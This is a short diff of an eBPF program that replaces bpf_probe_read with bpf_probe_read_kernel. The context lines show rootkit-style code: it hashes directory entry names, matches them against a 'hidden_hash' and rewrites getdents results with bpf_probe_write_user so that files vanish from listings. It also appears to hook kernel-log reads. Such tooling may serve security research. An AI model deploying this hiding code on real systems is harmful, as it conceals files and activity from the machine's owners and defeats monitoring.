@@ -106,7 +106,7 @@ int fa_override_getdents(struct pt_regs *ctx)
             hash = FNV_BASIS;
             update_hash_str(&hash, buff);
 
-            bpf_probe_read(&reclen, sizeof(reclen), (void *)&getdents->dirent->d_reclen);
+            bpf_probe_read_kernel(&reclen, sizeof(reclen), (void *)&getdents->dirent->d_reclen);
 
             if (hash == getdents->hidden_hash)
             {               
@@ -119,7 +119,7 @@ int fa_override_getdents(struct pt_regs *ctx)
         if (getdents->read < size && getdents->src && getdents->dirent != getdents->src)
         {
             struct linux_dirent64 src;
-            bpf_probe_read(&src, sizeof(src), getdents->src);
+            bpf_probe_read_kernel(&src, sizeof(src), getdents->src);
             src.d_off -= reclen;
 
             bpf_probe_write_user((void *)getdents->dirent, &src, sizeof(src));
@@ -127,7 +127,7 @@ int fa_override_getdents(struct pt_regs *ctx)
             int remains = src.d_reclen - sizeof(struct linux_dirent64);
             if (remains > 0)
             {
-                bpf_probe_read(buff, sizeof(buff), getdents->src + sizeof(struct linux_dirent64));
+                bpf_probe_read_kernel(buff, sizeof(buff), getdents->src + sizeof(struct linux_dirent64));
                 // currenlty doesn't support file longer than 220
                 copy((void *)getdents->dirent + sizeof(struct linux_dirent64), buff, remains);
             }
@@ -218,7 +218,7 @@ int fa_kmsg_user(struct pt_regs *ctx)
         return 0;
 
     char buf[128];
-    bpf_probe_read(buf, sizeof(buf), fd_attr->read_buf);
+    bpf_probe_read_kernel(buf, sizeof(buf), fd_attr->read_buf);
 
     u64 offset = 0, hash = 0;
 
